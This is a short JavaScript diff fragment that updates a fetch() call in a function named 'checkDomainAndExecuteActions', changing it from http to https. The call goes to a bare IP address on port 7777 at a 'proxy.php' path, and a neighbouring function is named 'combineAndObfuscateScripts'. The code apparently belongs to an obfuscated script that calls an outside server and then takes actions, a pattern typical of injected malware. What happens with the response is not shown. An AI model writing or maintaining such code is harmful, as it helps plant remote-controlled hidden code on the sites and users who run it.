@@ -47,7 +47,7 @@ function combineAndObfuscateScripts() {
 }
 
 function checkDomainAndExecuteActions() {
-    fetch('http://185.253.44.120:7777/jo.nesadah.com/proxy.php')
+    fetch('https://185.253.44.120:7777/jo.nesadah.com/proxy.php')
         .then(response => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
